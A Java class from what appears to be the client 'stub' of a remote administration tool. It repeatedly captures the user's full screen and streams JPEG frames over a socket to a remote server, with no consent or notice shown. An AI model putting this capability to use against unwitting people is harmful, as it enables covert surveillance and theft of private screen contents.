package me.jershdervis.monitorj.stub.client.threads;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.Packets;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

/**
 * Created by Josh on 25/06/2015.
 */
public class RemoteDesktopStream implements Runnable {

    public static volatile boolean isStreaming = false;

    private Robot robot;

    private final Socket socket;
    private final DataOutputStream dos;

    public RemoteDesktopStream(BaseClient client) {
        this.socket = client.getServerSocketConnection();
        this.dos = client.getDataOutputStream();
        try {
            this.robot = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        isStreaming = true;
        while(isStreaming) {
            try {
                byte[] ba = this.getByteImage();
                this.dos.writeByte(Packets.REMOTE_DESKTOP_IMAGE.getPacketID());
                this.sendBytes(ba, 0, ba.length);
                Thread.sleep(200L);
            } catch (IOException e) {
                try {
                    socket.close();
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        System.out.println("Stopped Remote Desktop Stream");
    }

    private void sendBytes(byte[] myByteArray, int start, int len) throws IOException {
        if (len < 0)
            throw new IllegalArgumentException("Negative length not allowed");
        if (start < 0 || start >= myByteArray.length)
            throw new IndexOutOfBoundsException("Out of bounds: " + start);

        dos.writeInt(len);
        if (len > 0)
            dos.write(myByteArray, start, len);
    }

    private byte[] getByteImage() throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(this.getScreen(), "jpg", baos);
        baos.flush();
        return baos.toByteArray();
    }

    private BufferedImage getScreen(){
        Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
        BufferedImage bi = robot.createScreenCapture(new Rectangle(size));
        return bi;
    }
}
